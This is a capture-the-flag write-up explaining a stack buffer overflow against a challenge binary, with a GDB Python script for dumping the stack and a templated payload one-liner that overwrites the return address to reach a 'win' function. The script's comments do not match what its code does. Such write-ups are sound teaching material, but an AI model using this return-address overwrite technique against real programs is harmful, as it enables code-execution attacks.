In this challenge we will overflow the buffer so that we can get to the memory location where return address is stored and change it to the address of win function

First I entered 4,5 A as input to see where the input variable starts from and then i located the return address by matching the return address which i got from objdump to a value on the stack. 

And for that i used the python script to print out all the stack from rsp to rbp.

```python
import gdb

# Function to read memory from rsp and print address and value if it's 0x41
def print_stack(rsp, rbp):
    num_bytes = rbp - rsp
    print(f"Reading memory from {hex(rsp)} to {hex(rsp + num_bytes)}:")

    # Iterate over the range of bytes
    
    for i in range(num_bytes+1):
        # Calculate the current memory address
        current_address = rsp + i
        
        # Read each byte from the address
        byte_value = gdb.parse_and_eval('*((unsigned char*){})'.format(hex(current_address)))

        # Print the address and value only if the value is 0x41
        print(f"Address: {hex(current_address)} | Value: {hex(byte_value)}")


# Get the current stack pointer (rsp)
rsp = gdb.parse_and_eval("$rsp")
rbp = gdb.parse_and_eval("$rbp")
print_stack(rsp, rbp)
```

Now we know from where the input buffer starts from and where the return address is, we can simply fill the space between return address and input variable and then the return address

Since we cannot have `\n` we will use python for this

    python -c 'import sys; sys.stdout.buffer.write(b"A"*(difference between input variable and return address location) + b"return address of win function in little endidan format")' | ./program


